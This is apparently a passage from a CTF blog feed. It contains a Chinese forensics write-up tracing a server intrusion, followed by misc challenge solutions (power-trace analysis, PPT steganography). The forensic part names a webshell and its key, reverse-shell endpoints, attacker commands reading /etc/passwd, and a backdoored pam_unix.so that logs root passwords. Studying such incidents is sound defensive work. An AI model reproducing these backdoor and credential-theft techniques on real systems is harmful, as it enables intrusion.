    <content type="html"><![CDATA[<h1 id="取证溯源"><a href="#取证溯源" class="headerlink" title="取证溯源"></a>取证溯源</h1><blockquote><p>1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。</p></blockquote><h2 id="关卡01：-100-分"><a href="#关卡01：-100-分" class="headerlink" title="关卡01： 100 分"></a>关卡01： 100 分</h2><blockquote><p>关卡描述：黑客攻击此服务器所使用的2个IP分别是什么（ascii码从小到大排列，空格分隔）</p></blockquote><p>流量包得到第一个攻击ip</p><p><img src="/img/wp/2024/2024ccb-quzheng-2.png"></p><p>在定时反弹的邮件中得到另一个ip</p><p><img src="/img/wp/2024/2024ccb-quzheng-1.png"></p><p><code>202.1.1.1 202.1.1.129</code></p><h2 id="关卡02：-50-分"><a href="#关卡02：-50-分" class="headerlink" title="关卡02： 50 分"></a>关卡02： 50 分</h2><blockquote><p>关卡描述：存在安全问题的apk中使用的登录密码是什么?</p></blockquote><p>jadx打开搜索<code>password</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-3.png"></p><p><code>password663399</code></p><h2 id="关卡03：-50-分"><a href="#关卡03：-50-分" class="headerlink" title="关卡03： 50 分"></a>关卡03： 50 分</h2><blockquote><p>关卡描述：黑客尝试上传一个文件但显示无上传权限的文件名是什么？</p></blockquote><p>在流量包中搜索</p><p><img src="/img/wp/2024/2024ccb-quzheng-4.png"></p><p><code>pic.jpg</code></p><h2 id="关卡04：-150-分"><a href="#关卡04：-150-分" class="headerlink" title="关卡04： 150 分"></a>关卡04： 150 分</h2><blockquote><p>关卡描述：黑客利用的漏洞接口的api地址是什么?（<a href="http://xxxx/xx">http://xxxx/xx</a>)</p></blockquote><p>找到上传成功的那个包即可</p><p><img src="/img/wp/2024/2024ccb-quzheng-5.png"></p><p><code>http://202.1.1.66:8080/api/upload</code></p><h2 id="关卡05：-150-分"><a href="#关卡05：-150-分" class="headerlink" title="关卡05： 150 分"></a>关卡05： 150 分</h2><blockquote><p>关卡描述：黑客上传的webshell绝对路径是什么？</p></blockquote><p>连上靶机，找到tomcat根目录，然后根据上一题的访问路径找到shell</p><p><img src="/img/wp/2024/2024ccb-quzheng-6.png"></p><p><code>/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp</code></p><h2 id="关卡06：-150-分"><a href="#关卡06：-150-分" class="headerlink" title="关卡06： 150 分"></a>关卡06： 150 分</h2><blockquote><p>关卡描述：黑客上传的webshell的密码是什么？</p></blockquote><p>分析上上题的代码</p><p><img src="/img/wp/2024/2024ccb-quzheng-7.png"></p><p><code>bing_pass</code></p><h2 id="关卡07：-200-分"><a href="#关卡07：-200-分" class="headerlink" title="关卡07： 200 分"></a>关卡07： 200 分</h2><blockquote><p>关卡描述：黑客通过webshell执行的第一条命令是什么？</p></blockquote><p>筛选访问<code>/static/s74e7vwmzs21d5x6.jsp</code>的流量</p><p>第一个包是冰蝎的状态检测，所以应该看第二个包</p><p>密钥是<code>b99f657b04941030</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-10.png"></p><p>解aes后反编译</p><p><img src="/img/wp/2024/2024ccb-quzheng-8.png"></p><p><code>pwd</code></p><h2 id="关卡08：-150-分"><a href="#关卡08：-150-分" class="headerlink" title="关卡08： 150 分"></a>关卡08： 150 分</h2><blockquote><p>关卡描述：黑客获取webshell时查询当前shell的权限是什么？</p></blockquote><p>继续跟<code>/static/s74e7vwmzs21d5x6.jsp</code>的流量</p><p>找到执行<code>whoami</code>的</p><p><img src="/img/wp/2024/2024ccb-quzheng-11.png"></p><p>拿返回值解密aes，再解base64</p><p><img src="/img/wp/2024/2024ccb-quzheng-9.png"></p><p><code>tomcat</code></p><h2 id="关卡09：-150-分"><a href="#关卡09：-150-分" class="headerlink" title="关卡09： 150 分"></a>关卡09： 150 分</h2><blockquote><p>关卡描述：利用webshell查询服务器Linux系统发行版本是什么？</p></blockquote><p>步骤和上一题一样</p><p>有一个包执行了<code>cat /etc/redhat-release</code>，找返回值解密即可</p><p><img src="/img/wp/2024/2024ccb-quzheng-12.png"></p><p><code>CentOS Linux release 7.4.1708 (Core)</code></p><h2 id="关卡10：-50-分"><a href="#关卡10：-50-分" class="headerlink" title="关卡10： 50 分"></a>关卡10： 50 分</h2><blockquote><p>关卡描述：黑客从服务器上下载的秘密文件的绝对路径是什么？</p></blockquote><p>shell同目录下可以看到<code>secert.file</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-13.png"></p><p><code>/usr/local/tomcat/webapps/ROOT/static/secert.file</code></p><h2 id="关卡11：-50-分"><a href="#关卡11：-50-分" class="headerlink" title="关卡11： 50 分"></a>关卡11： 50 分</h2><blockquote><p>关卡描述：黑客通过反连执行的第一条命令是什么？</p></blockquote><p>找到反弹shell的地址<code>202.1.1.129:4444</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-14.png"></p><p>在流量包中筛选4444端口，然后追踪流</p><p><img src="/img/wp/2024/2024ccb-quzheng-15.png"></p><p><code>cat /etc/passwd</code></p><h2 id="关卡12：-50-分"><a href="#关卡12：-50-分" class="headerlink" title="关卡12： 50 分"></a>关卡12： 50 分</h2><blockquote><p>关卡描述：黑客通过什么文件修改的root密码（绝对路径）</p></blockquote><p>图片同上</p><p><code>/etc/passwd</code></p><h2 id="关卡13：-250-分"><a href="#关卡13：-250-分" class="headerlink" title="关卡13： 250 分"></a>关卡13： 250 分</h2><blockquote><p>关卡描述：黑客设置的root密码是多少？</p></blockquote><p>爆破上上图中的hash</p><p><img src="/img/wp/2024/2024ccb-quzheng-16.png"></p><p><code>123456</code></p><h2 id="关卡14：-50-分"><a href="#关卡14：-50-分" class="headerlink" title="关卡14： 50 分"></a>关卡14： 50 分</h2><blockquote><p>关卡描述：黑客留下后门的反连的ip和port是什么？（ip:port)</p></blockquote><p>查看定时任务</p><p><img src="/img/wp/2024/2024ccb-quzheng-17.png"></p><p><code>202.1.1.129:9999</code></p><h2 id="关卡15：-150-分"><a href="#关卡15：-150-分" class="headerlink" title="关卡15： 150 分"></a>关卡15： 150 分</h2><blockquote><p>关卡描述：黑客通过后门反连执行的第一条命令是什么？</p></blockquote><p>流量过滤9999单端口</p><p><img src="/img/wp/2024/2024ccb-quzheng-18.png"></p><p><code>rpm -qa | grep pam</code></p><h2 id="关卡16：-200-分"><a href="#关卡16：-200-分" class="headerlink" title="关卡16： 200 分"></a>关卡16： 200 分</h2><blockquote><p>关卡描述：黑客通过什么文件留下了后门？</p></blockquote><p>根据上一题的命令去搜索pam相关文件</p><p>找到<code>/usr/lib/security/pam_unix.so</code>和<code>/usr/lib64/security/pam_unix.so</code></p><p>存在后门</p><p><img src="/img/wp/2024/2024ccb-quzheng-19.png"></p><p><code>pam_unix.so</code></p><h2 id="关卡17：-300-分"><a href="#关卡17：-300-分" class="headerlink" title="关卡17： 300 分"></a>关卡17： 300 分</h2><blockquote><p>关卡描述：黑客设置的后门密码是什么？</p></blockquote><p>继续往下走，直接看到密码</p><p><img src="/img/wp/2024/2024ccb-quzheng-20.png"></p><p><code>ssh_back_pwd</code></p><h2 id="关卡18：-250-分"><a href="#关卡18：-250-分" class="headerlink" title="关卡18： 250 分"></a>关卡18： 250 分</h2><blockquote><p>关卡描述：黑客的后门将root密码记录在哪个文件中？（绝对路径）</p></blockquote><p>继续向下</p><p><img src="/img/wp/2024/2024ccb-quzheng-21.png"></p><p><code>/tmp/.sshlog</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;取证溯源&quot;&gt;&lt;a href=&quot;#取证溯源&quot; class=&quot;headerlink&quot; title=&quot;取证溯源&quot;&gt;&lt;/a&gt;取证溯源&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="长城杯" scheme="https://www.dr0n.top/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    
    <category term="取证" scheme="https://www.dr0n.top/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>第十七届全国大学生信息安全竞赛-创新实践能力赛初赛</title>
    <link href="https://www.dr0n.top/posts/19d58d81/"/>
    <id>https://www.dr0n.top/posts/19d58d81/</id>
    <published>2024-05-20T04:30:00.000Z</published>
    <updated>2024-06-25T10:12:26.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h2><p>先将npz解压，然后将功耗转成图片分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>ind=np.load(<span class="hljs-string">&quot;index.npy&quot;</span>)<br>p=np.load(<span class="hljs-string">&quot;trace.npy&quot;</span>)<br><br><span class="hljs-keyword">for</span> j,a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(p):<br>    img=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">5000</span>,<span class="hljs-number">300</span>),<span class="hljs-number">255</span>)<br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>        img.putpixel((i,<span class="hljs-built_in">int</span>(v*<span class="hljs-number">100</span>)+<span class="hljs-number">150</span>),<span class="hljs-number">0</span>)<br>    img.save(<span class="hljs-string">&quot;output/%s.png&quot;</span>%j)<br></code></pre></td></tr></table></figure><p>将四十张图片一组，找到不同的图片，然后在输入的表中找到索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 读取数组</span><br><span class="hljs-built_in">print</span>(np.load(<span class="hljs-string">&#x27;input.npy&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27;</span><br><span class="hljs-string"> &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27;</span><br><span class="hljs-string"> &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27;</span><br><span class="hljs-string"> &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27;</span><br><span class="hljs-string"> &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27;</span><br><span class="hljs-string"> &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27;</span><br><span class="hljs-string"> &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27;</span><br><span class="hljs-string"> &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27;</span><br><span class="hljs-string"> &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27;</span><br><span class="hljs-string"> &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27;</span><br><span class="hljs-string"> &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27;</span><br><span class="hljs-string"> &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;</span><br><span class="hljs-string"> &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对比后得到登录密码<code>_ciscn_2024_</code></p><h2 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h2><p>连接MetaMask后开始游戏</p><p><img src="/img/wp/2024/2024ciscn-%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-1.png"></p><p><img src="/img/wp/2024/2024ciscn-%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-2.png"></p><h2 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h2><p>PPT第三页</p><p><code>UGF5dDQ6NmYtNDA=</code>解base64得到<code>Payt4:6f-40</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-1.png"></p><p>PPT第五页</p><p>备注中的字符串循环解密base64得到<code>pArt5:5f-90d</code></p><p>左上角的<code>UGFyVDY6ZC0y</code>base64解密得到<code>ParT6:d-2</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-2.png"></p><p>在<code>ppt\slides\slide4.xml</code>中找到第七部分</p><p>ROT13然后base64 <code>PART7=22b3</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HRSFIQp9ZwWvZj==&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ROT13(All)&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>ppt\slideLayouts\slideLayout2.xml</code>或者幻灯片母版中可以看到第八部分</p><p>去除B,b,1,3后base64  <code>paRt8:87e</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>c1GFSbd3Dg6BODbdl<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>Remove All <span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>’B ’/’b’ /’1 ’/’3’<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>ppt\media\image57.jpg</code>底部存在密文，base64解密得到<code>parT9:dee</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-3.png"></p><p>在<code>ppt\comments\comment1.xml</code>中得到第十部分</p><p>维吉尼亚后base64 <code>PARt10:9&#125;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>ZYWJbIYnFhq9<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>What is this？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Vigenere cipher is good！<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Aha，the key is<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Is what？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>furry<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>🆗<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>docProps\app.xml</code>得到加密方式，<code>docProps\core.xml</code>得到密文和密钥</p><p>Bifid解密后base64 <code>Part1:flag&#123;e</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span>&gt;</span>Bifid cipher<span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:title</span>&gt;</span>这是一个标题 QFCfpPQ6ZymuM3gq<span class="hljs-tag">&lt;/<span class="hljs-name">dc:title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:creator</span>&gt;</span>Administrator;Key:lanjing<span class="hljs-tag">&lt;/<span class="hljs-name">dc:creator</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将<code>ppt\embeddings\Microsoft_Word_Document.docx</code>改成zip解压</p><p><code>word\document.xml</code>得到第二部分</p><p>凯撒偏移10后base64 <code>part2:675efb</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 